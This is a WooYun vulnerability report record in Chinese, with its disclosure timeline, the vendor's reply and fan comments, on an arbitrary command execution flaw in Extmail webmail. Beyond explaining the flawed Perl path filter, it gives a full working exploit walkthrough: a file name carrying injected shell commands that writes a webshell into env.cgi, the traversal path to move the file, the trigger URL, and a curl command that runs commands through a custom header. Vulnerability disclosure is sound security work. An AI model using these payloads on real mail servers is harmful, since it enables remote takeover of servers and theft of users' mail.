{"id": 82409, "wybug_id": "wooyun-2015-0151160", "wybug_title": "Extmail存在任意命令执行漏洞", "wybug_corp": "Extmail", "wybug_author": "Map", "wybug_date": "2015-11-02 09:04", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： Extmail 是一个流行的邮箱部署应用，很多公司都使用了该产品来部署邮箱。它存在一个任意命令执行漏洞，通过该漏洞可以获取服务器的权限。这个漏洞要感谢letvcloud 的 yangtong 、ifeng.com 的caoyang。 详细说明：  在libs/Ext/App/Message.pm 内：有以下代码：\nmy $cmd = \"$sys->{SYS_CONFIG}/tools/spam_report.pl --type=$app --report_spam --single --msg=$msg\";\n如果我们可以控制$msg，我们就可以执行任意代码，往上走看$msg 从哪里来。 my $msg = $MSGFILE; 再往上走：\n$MSGFILE = $ENV{MAILDIR}; # XXX $MSGFILE .= '/'._name2mdir($FOLDER);\n 省略一点代码……\nif($file eq $MSGID || !$MSGID){\t$MSGFILE .= '/cur/'.$file;\n所以 如果$file（文件名） 等于 $MSGID ，那么就会把文件名附加给$MSGFILE 。好吧，我直接进入主题，只要我们能再cur下放一个文件名对的文件，那么我们就可以执行任意命令了，我们怎么把文件放过去呢？在 libs/Ext/Storage/Fileman.pm 内\nsub op_move {    my ($from, $to) = @_;    $from = fixpath($from);    $to = fixpath($to);\n省略一点代码……\nrename(untaint($rfrom), untaint(\"$rto/$fromname\")) ||\n…………我们看看fixpath是怎么写的。\nsub fixpath {    my $path = shift;    # fix bug, old bug code: $path =~ s#\\.{2,}/##g;    $path =~ s#/\\.+##g; # strip /.. or /... etc    $path =~ s#\\.+/##g; # strip ../ or .../ etc    $path =~ s#\\\\\\.+##g; # strip \\. or \\... etc    $path =~ s#\\\\+##g;   # strip \\\\ or \\\\\\ etc    $path;}\n还是那句话，多字节的替换是不安全的。当提交的内容是：..\\\\/cur/的时候，剩下的会是../cur/，所以使用这个网盘功能，上传了文件之后，我们可以把这个文件顺利的移动到./cur/下，也就是这个用户的收件箱。其实运气特别好，因为fixpath函数要是单独使用的话，可以是剩下../的，如果和$CFG{path}使用的话，就毛都不剩下了，例如：\nmy $rto = fixslash(fixpath(\"$CFG{path}/$to\"));\n接下来我还是演示一下这个漏洞吧，使用官方的在线演示站点演示一下，我直接使用官方的测试版本测试吧\n\n（接下来的所有URL里出现的sid参数都为当前登录身份的sid，每个登录用户的是不一样的，请知）在 http://**.**.**.**/extmail/cgi/index.cgi 使用demo 账户登录进去。在网盘功能页面http://**.**.**.**/extmail/cgi/netdisk.cgi?__mode=list_dir&sid=336f95e4406cbeb90dc4754b112785b0 上传一封邮件格式的文件，例如：文件名：1\n\n内容：\nFrom: \"=?ISO-8859-1?B?dGVzdA==?=\" <xxx@**.**.**.**>To: xxx@**.**.**.**Subject: =?ISO-8859-1?B?bmloYW95YQ==?=Date: Fri, 30 Oct 2015 10:37:43 +0800Mime-version: 1.0X-Originating-Ip: []X-Mailer: ExtMail 1.1.0Content-Type: text/plain; charset=\"ISO-8859-1\"Content-Transfer-Encoding: base64bmloYW95YQ0K\n然后给该文件修改一个名字：&& cd .. && cd .. && cd .. && cd .. && cd .. && cd .. && cd .. && cd var && cd www && cd cgi-bin && cd extmail && cd cgi && echo 'system($ENV{\"HTTP_EVIL\"});' >> env.cgi &&然后用 firebug 修改一下表单内的 / 为 ..\\\\/cur/ 。\n\n\n\n然后选择该下拉，点击 “移动到” ，然后你就回在收件箱里看到这封邮件。\n\n然后查看框代码，搜素report，找到对应的URL，然后将msgid里的参数做一下URL编码。\n\n\nreadmsg.cgi?__mode=report&sid=336f95e4406cbeb90dc4754b112785b0&folder=Inbox&pos=0&msgid=&& cd .. && cd .. && cd .. && cd .. && cd .. && cd .. && cd .. && cd var && cd www && cd cgi-bin && cd extmail && cd cgi && echo 'system($ENV{\"HTTP_EVIL\"});' >> env.cgi &&\n好了，你已经拥有了一个更好操作的webshell了。\n\n具体的路径：http://**.**.**.**/extmail/cgi/env.cgi 会告诉你。curl -H \"EVIL:ls -al\" http://**.**.**.**/extmail/cgi/env.cgi -silence |grep -v \"<\"\n\n就是这么顺利。   漏洞证明：     修复方案：  你懂的。   版权声明：转载请注明来源 Map@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-11-06 15:07 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件和电话通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-02 09:14 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:230 漏洞数:30        | 是金子总会发光，在还未发光之前，先磨磨)\t\t \n  0day!    \n     2015-11-02 09:15 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:95        | Wooyun的Rank获取如同Dota冲天梯有过之而无...)\t\t \n  0day!    \n     2015-11-02 09:15 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1101 漏洞数:257        | 1.乌云最帅的男人                        ...)\t\t \n  瞬间有雷！    \n     2015-11-02 09:16 |    \t\tfuckadmin \t\t\t( 普通白帽子  |\t\t\t        Rank:616 漏洞数:87        | 千里之堤溃于蚁穴)\t\t \n  要关注~    \n     2015-11-02 09:19 |    \t\t撸大叔 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:11        | 钓鱼培养耐心  养鱼需要精心！)\t\t \n  关注！    \n     2015-11-02 09:22 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:51        | 关注网络安全，提高技术！)\t\t \n  必须关注Map大牛    \n     2015-11-02 09:23 |    \t\tbackda0 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:20        | none)\t\t \n  1day!    \n     2015-11-02 09:44 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:711 漏洞数:73        | root@qisec.com)\t\t \n  大牛    \n     2015-11-02 09:45 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  ODAY出现了。。。    \n     2015-11-02 09:47 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  0day~    \n     2015-11-02 09:52 |    \t\twy007 \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:11        | 其实我是一名卧底...)\t\t \n  等了好久的0day，终于横空出世~    \n     2015-11-02 09:54 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:318 漏洞数:50        )\t\t \n  膜拜    \n     2015-11-02 09:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:282 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  大神又来搞perl了    \n     2015-11-02 10:07 |    \t\t途牛旅游网(乌云厂商)\t\t \n  出现了=.=    \n     2015-11-02 10:12 |    \t\tchock \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:23        | 若你喜欢怪人)\t\t \n  骆驼肉不是谁都能啃得下的    \n     2015-11-02 10:30 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:48        )\t\t \n  瞬间    \n     2015-11-02 10:33 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:58        | 我是残废，啦啦啦啦)\t\t \n  666666666666    \n     2015-11-02 10:50 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:29        | 不会挖洞洞的猿猿不是好学生)\t\t \n  @途牛旅游网 你是要赶紧升级的节奏吗    \n     2015-11-02 11:07 |    \t\tU神 \t\t\t( 普通白帽子  |\t\t\t        Rank:1343 漏洞数:148        | 五个乌云币都不给我留着，兄弟们太小气了吧)\t\t \n  太厉害了，又有人要拿他刷事件了    \n     2015-11-02 11:43 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  EXP    \n     2015-11-02 12:43 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:29        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  mark    \n     2015-11-02 12:45 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  大赚    \n     2015-11-02 12:58 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  赞    \n     2015-11-02 13:05 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:868 漏洞数:132        )\t\t \n  大牛！    \n     2015-11-02 13:10 |    \t\t403 \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:13        | 求收编！)\t\t \n  天雷滚滚！    \n     2015-11-02 13:11 |    \t\t大宗师 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 政府单位 web安全工程师)\t\t \n  大牛 果然牛逼啊    \n     2015-11-02 13:17 |    \t\t白开水 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:27        | 苍茫的天涯是我的爱~)\t\t \n  mark    \n     2015-11-02 13:52 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:21        | test\" src=\"/upload/avatar/avatar_251_b.j...)\t\t \n  快忽略,就等这了..    \n     2015-11-02 14:00 |    \t\ts4cr00t \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 自由，共享，平等)\t\t \n  膜拜，mark    \n     2015-11-02 14:05 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:10        | 简单点!啪......嚓~~)\t\t \n  好屌    \n     2015-11-02 14:06 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:79        | 潜心学习~~~)\t\t \n  硬汉    \n     2015-11-02 14:07 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:36        | 这个人有点懒，没有写个人简介)\t\t \n  快忽略,就等这了..    \n     2015-11-02 14:16 |    \t\t霝z \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:41        | 不值得生气~就这样。see you soon.)\t\t \n  这是打包所有邮件的节奏啊。。    \n     2015-11-02 14:23 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:526 漏洞数:113        | 看我看我看我啊)\t\t \n  @range 我觉得就是厂商忽略了，乌云也不会公开的    \n     2015-11-02 14:35 |    \t\tphoenix \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 多读，多看，多做！)\t\t \n  0day！！！！    \n     2015-11-02 15:03 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:134        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  你真是个好人。    \n     2015-11-02 15:16 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1423 漏洞数:203        | 。)\t\t \n  真是一个好人。    \n     2015-11-02 15:33 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:14        | 像个傻瓜似的，为什么。)\t\t \n  坐等公开    \n     2015-11-02 15:40 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:21        | test\" src=\"/upload/avatar/avatar_251_b.j...)\t\t \n  @计算姬 忽略包公开,这是流程    \n     2015-11-02 15:43 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:440 漏洞数:92        | 来自喵星的太空喵)\t\t \n  Monster kill!!!    \n     2015-11-02 15:58 |    \t\tEvi1cg \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 喵喵汪~)\t\t \n  坐等公开    \n     2015-11-02 16:31 |    \t\tHex \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:14        | 又一天过去了，今天过得怎么样，梦想是不是...)\t\t \n  0day 大牛    \n     2015-11-02 16:34 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:229 漏洞数:57        )\t\t \n  0day     \n     2015-11-02 16:46 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:19        | TXTSEC信息安全团队)\t\t \n  0day    \n     2015-11-02 16:53 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:526 漏洞数:113        | 看我看我看我啊)\t\t \n  @银冥币 没没没，你看看以往的就知道了，后台操作一下就可以了。    \n     2015-11-02 18:31 |    \t\t我爱水秀天蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:15        | 好好学习，天天向上！)\t\t \n  牛逼。跟帖留名。这个不知道是谁的马甲。    \n     2015-11-02 18:51 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:25        | Please speak in Chinese.)\t\t \n  0day！！！帅气    \n     2015-11-02 20:58 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:21        | test\" src=\"/upload/avatar/avatar_251_b.j...)\t\t \n  @计算姬 厂商都忽略了的话...就肯定是公开的啊....    \n     2015-11-03 10:46 |    \t\tH.Rui \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | Yeah！)\t\t \n  围观！    \n     2015-11-03 10:53 |    \t\tU神 \t\t\t( 普通白帽子  |\t\t\t        Rank:1343 漏洞数:148        | 五个乌云币都不给我留着，兄弟们太小气了吧)\t\t \n  @计算姬 对方没有选通用    \n     2015-11-03 11:57 |    \t\tCatsay \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:18        | 屌丝一枚)\t\t \n  坐等公开    \n     2015-11-06 15:11 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  perl好难看懂- -    \n     2015-12-03 01:19 |    \t\t节奏感 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 共同进步 共同奋斗 共同奉献)\t\t \n  oday    \n     2016-01-12 16:28 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:52        | 只会送人头)\t\t \n  nice    \n     2016-01-12 16:30 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1228 漏洞数:327        | 穷苦人家的孩子)\t\t \n  很可惜需要登录啊~    \n     2016-01-13 10:42 |    \t\t子墨 \t\t\t( 普通白帽子  |\t\t\t        Rank:264 漏洞数:28        | 天地不仁,以万物为刍狗;圣人不仁,以百姓为...)\t\t \n  必须要有网盘功能？！    \n     2016-01-13 10:53 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  我好想现在就命令执行一下！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}